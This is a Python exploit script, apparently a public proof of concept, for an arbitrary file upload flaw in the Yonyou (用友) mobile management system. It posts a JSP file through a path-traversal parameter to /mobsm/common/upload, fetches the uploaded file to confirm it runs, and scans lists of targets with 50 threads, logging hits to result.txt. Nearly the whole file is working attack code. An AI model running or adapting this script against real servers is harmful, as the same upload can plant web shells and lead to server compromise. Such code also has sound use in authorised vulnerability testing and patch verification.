# 用友 移动管理系统 upload 任意文件上传漏洞
import argparse,re
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                                    author:watermelon_xz🍉
                                          version:用友 移动管理系统 upload 任意文件上传漏洞
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="用友 移动管理系统 upload 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = "/mobsm/common/upload?category=../webapps/nc_web/maupload/apk"
    url = target+payload
    headers = {
    'User-Agent':'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)',
    'Accept-Encoding':'gzip, deflate, br',
    'Accept-Language':'zh-CN,zh;q=0.9',
    'Content-Type':'multipart/form-data; boundary=f0172fd9dce75a2e80782ea59104aa75572bb578836be10bb15b5334876a',
    'Connection':'close',
         }
    data = (
        '--f0172fd9dce75a2e80782ea59104aa75572bb578836be10bb15b5334876a\r\n'
        'Content-Disposition:form-data; name="file"; filename="indexlist.jsp"\r\n'
        'Content-Type:application/octet-stream\r\n'
        '\r\n'
        '<% out.println("watermelon");%>\r\n'
        '--f0172fd9dce75a2e80782ea59104aa75572bb578836be10bb15b5334876a--\r\n'
    )
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }


    #请求网页
    try:
        re0 = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
        if re0.status_code == 200 and 'retCode' in re0.text:
            # print(re0.text)
            # print(f'[+++]该{target}存在用友 移动管理系统 upload 任意文件上传漏洞')
            payload1 = re.findall('nc_web(.*?)"}]',re0.text,re.S)
            # print(payload1[0])
            url1=target+payload1[0]
            re1= requests.get(url=url1,verify=False,proxies=proxies)
            # print(re1.text)
            if re1.status_code==200 and 'watermelon' in re1.text:
                print(f'[+++]{target}存在用友 移动管理系统 upload 任意文件上传漏洞\n文件上传后地址为{url1}')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True 
        else:
            print(f'该{target}不存在该漏洞')
    except:
        print(f'该{target}存在问题，请手动测试')


if __name__ == '__main__':
    main()